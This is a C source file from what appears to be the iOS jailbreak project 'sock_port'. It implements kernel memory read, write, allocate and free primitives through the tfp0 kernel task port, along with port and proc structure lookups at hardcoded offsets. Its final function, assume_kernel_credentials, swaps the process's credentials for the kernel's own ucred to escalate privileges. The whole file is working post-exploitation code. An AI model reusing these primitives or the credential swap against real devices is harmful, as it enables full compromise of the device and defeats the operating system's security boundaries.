//
//  kernel_memory.c
//  sock_port
//
//  Created by Jake James on 7/18/19.
//  Copyright © 2019 Jake James. All rights reserved.
//

#include "kernel_memory.h"
#include <stdbool.h>
#include "exploit.h"
static uint64_t kernel_get_proc_for_task(uint64_t task);
static mach_port_t tfpzero;

void init_kernel_memory(mach_port_t tfp0) {
    tfpzero = tfp0;
}

uint64_t kalloc(vm_size_t size) {
    mach_vm_address_t address = 0;
    mach_vm_allocate(tfpzero, (mach_vm_address_t *)&address, size, VM_FLAGS_ANYWHERE);
    return address;
}

void kfree(mach_vm_address_t address, vm_size_t size) {
    mach_vm_deallocate(tfpzero, address, size);
}

size_t kread(uint64_t where, void *p, size_t size) {
    int rv;
    size_t offset = 0;
    while (offset < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_read_overwrite(tfpzero, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
        if (rv || sz == 0) {
            printf("[-] error on kread(0x%016llx)\n", where);
            break;
        }
        offset += sz;
    }
    return offset;
}

uint32_t rk32(uint64_t where) {
    uint32_t out;
    kread(where, &out, sizeof(uint32_t));
    return out;
}

uint64_t rk64(uint64_t where) {
    uint64_t out;
    kread(where, &out, sizeof(uint64_t));
    return out;
}

size_t kwrite(uint64_t where, const void *p, size_t size) {
    int rv;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_write(tfpzero, where + offset, (mach_vm_offset_t)p + offset, (int)chunk);
        if (rv) {
            printf("[-] error on kwrite(0x%016llx)\n", where);
            break;
        }
        offset += chunk;
    }
    return offset;
}

void wk32(uint64_t where, uint32_t what) {
    uint32_t _what = what;
    kwrite(where, &_what, sizeof(uint32_t));
}


void wk64(uint64_t where, uint64_t what) {
    uint64_t _what = what;
    kwrite(where, &_what, sizeof(uint64_t));
}

uint64_t find_port(mach_port_name_t port, uint64_t task_self) {
    uint64_t task_addr = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    uint64_t port_addr = rk64(is_table + (port_index * sizeof_ipc_entry_t));
    
    return port_addr;
}

bool kernel_ipc_port_lookup(uint64_t task, mach_port_name_t port_name, uint64_t *ipc_port, uint64_t *ipc_entry) {
    uint64_t itk_space = rk64(task + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint32_t is_table_size = rk32(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE_SIZE));
    uint32_t port_index = MACH_PORT_INDEX(port_name);
    if (port_index >= is_table_size) {
        return false;
    }

    uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    uint64_t entry = is_table + port_index * 0x18;
    if (ipc_entry != NULL) {
        *ipc_entry = entry;
    }
    
    if (ipc_port != NULL) {
        *ipc_port = rk64(entry + 0);
    }
    return true;
}
static uint64_t kernel_get_proc_for_task(uint64_t task) {
    return rk64(task + 0x358);
}

void assume_kernel_credentials(uint64_t *ucred_field, uint64_t *ucred) {
    printf("[i] Assuming Kernel Credentials! -- Heyo!\n");
    uint64_t proc_self = kernel_get_proc_for_task(rk64(self_port_addr + 0x68));
    uint64_t kernel_proc = kernel_get_proc_for_task(kern_task_addr);
    printf("[i] Found kernel_proc: 0x%16llx\n", kernel_proc);
    uint64_t proc_self_ucred_field = proc_self + 0xf8;
    uint64_t kernel_proc_ucred_field = kernel_proc + 0xf8;
    printf("[i] Found kernel_proc_ucred_field: 0x%16llx\n", kernel_proc_ucred_field);
    uint64_t proc_self_ucred = rk64(proc_self_ucred_field);
    uint64_t kernel_proc_ucred = rk64(kernel_proc_ucred_field);
    wk64(proc_self_ucred_field, kernel_proc_ucred);
    *ucred_field = proc_self_ucred_field;
    *ucred = proc_self_ucred;
    printf("[i] Got Kern Creds!!! We out here!\n");
}
